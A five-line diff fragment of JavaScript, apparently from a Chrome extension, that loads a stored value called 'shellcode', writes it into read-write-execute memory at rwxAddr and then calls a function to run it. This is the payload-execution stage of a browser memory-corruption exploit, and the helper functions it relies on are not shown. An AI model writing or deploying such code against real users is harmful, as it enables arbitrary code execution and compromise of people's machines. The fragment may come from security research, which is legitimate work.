@@ -1,0 +1,5 @@
+chrome.storage.local.get(["shellcode"], (result) => {
+  const shellcode = result.shellcode;
+  copy_shellcode(rwxAddr, shellcode);
+  f();
+});
